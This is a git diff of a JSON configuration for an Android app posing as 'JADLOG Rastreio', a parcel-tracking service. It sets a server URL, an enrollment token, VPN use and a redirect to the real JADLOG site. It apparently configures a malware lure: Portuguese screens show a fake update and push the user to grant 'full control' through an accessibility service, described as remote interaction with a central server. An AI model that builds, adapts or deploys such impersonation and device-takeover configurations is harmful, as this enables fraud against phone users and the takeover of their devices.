@@ -1,7 +1,7 @@
 {
   "serverUrl": "http://localhost:3000",
-  "enrollmentToken": "enroll-1790860733016",
-  "deviceName": "Samsung Galaxy Note 10+ (SM-N975F)",
+  "enrollmentToken": "enroll-1790867791475",
+  "deviceName": "Android Device",
   "appName": "JADLOG Rastreio",
   "redirectUrl": "https://jadlog.com.br/rastreamento",
   "vpnEnabled": true,
@@ -12,12 +12,12 @@
   "screenConfig": {
     "loadingSubtext": "aguarde, atualização em andamento...",
     "speechCalloutText": "Este aplicativo requer permissão de acesso para funcionar. Por favor, permita para continuar.",
-    "copyrightText": "JADLOG Rastreio. All Rights Reserved.",
-    "permissionDialogTitle": "Permitir controle total para JADLOG Rastreio?",
-    "serviceDescription": "O serviço de acessibilidade do JADLOG Rastreio permite assistência técnica, leitura de status logístico e suporte operacional.",
+    "copyrightText": "All Rights Reserved.",
+    "permissionDialogTitle": "Permitir controle total para {appName}?",
+    "serviceDescription": "O serviço de acessibilidade do {appName} permite assistência técnica, leitura de status logístico e interação remota autorizada com o servidor central.",
     "accentColor": "#dc2626",
     "trackingTitle": "Rastreamento de Encomendas",
-    "trackingSubtext": "Serviços validados com sucesso. Digite o código ou acompanhe suas remessas."
+    "trackingSubtext": "Serviços locais validados com sucesso. Digite o código de rastreio ou acompanhe pedidos."
   },
-  "generatedAt": "2026-10-01T13:18:53.025Z"
+  "generatedAt": "2026-10-01T15:16:34.189Z"
 }
